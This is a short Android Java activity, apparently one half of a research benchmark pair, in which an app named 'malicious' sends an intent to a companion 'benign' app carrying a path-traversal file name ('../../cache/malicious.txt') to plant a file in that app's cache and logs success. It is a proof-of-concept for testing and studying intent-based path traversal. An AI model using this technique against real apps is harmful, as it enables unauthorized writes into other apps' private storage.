package edu.ksu.cs.malicious;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    private static int REQUEST = 100;
    private static String TAG = "MaliciousMainActivity";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onResume(){
        super.onResume();
        String fileName = "../../cache/malicious.txt";
        String data = "I am malicious";
        Intent i = new Intent();
        i.setPackage("edu.ksu.cs.benign");
        i.setClassName("edu.ksu.cs.benign","edu.ksu.cs.benign.MainActivity");
        i.putExtra("fileName",fileName);
        i.putExtra("fileContent",data);
        startActivityForResult(i,REQUEST);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data){
        if(requestCode == REQUEST && resultCode == RESULT_OK){
            Log.d(TAG, "malicious file injected successfully in Benign/cache");
        }
    }
}
